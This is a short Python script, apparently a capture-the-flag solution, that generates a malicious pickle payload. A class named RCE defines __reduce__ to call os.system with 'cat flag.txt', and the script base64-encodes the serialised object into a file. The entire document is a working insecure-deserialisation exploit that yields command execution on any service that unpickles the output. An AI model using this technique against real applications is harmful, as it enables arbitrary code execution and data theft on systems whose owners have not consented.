import base64
import pickle
import os

class RCE:
    def __reduce__(self):
        return os.system, ('cat flag.txt',)

outfile = open('output', 'wb')
outfile.write(base64.b64encode(pickle.dumps(RCE())))
outfile.close()
